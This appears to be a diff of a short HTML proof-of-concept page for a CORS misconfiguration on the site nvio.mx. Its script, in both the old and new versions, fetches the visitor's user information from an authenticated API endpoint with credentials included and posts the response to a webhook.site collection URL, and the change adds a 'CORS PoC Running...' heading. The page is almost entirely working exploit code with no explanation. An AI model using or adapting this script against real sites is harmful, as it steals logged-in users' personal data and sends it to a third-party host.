@@ -2,25 +2,15 @@
 <html>
   <body>
     <script>
-      fetch("https://nvio.mx/api/userinfo", {
-        method: "GET",
-        credentials: "include"
-      })
-      .then(res => res.text())
-      .then(data => {
-        fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
-          method: "POST",
-          mode: "no-cors",
-          body: data
+      fetch("https://nvio.mx/api/userinfo", { credentials: "include" })
+        .then(res => res.text())
+        .then(data => {
+          fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
+            method: "POST",
+            body: data
+          });
         });
-      })
-      .catch(err => {
-        fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
-          method: "POST",
-          mode: "no-cors",
-          body: "Error: " + err
-        });
-      });
     </script>
+    <h1>CORS PoC Running...</h1>
   </body>
 </html>
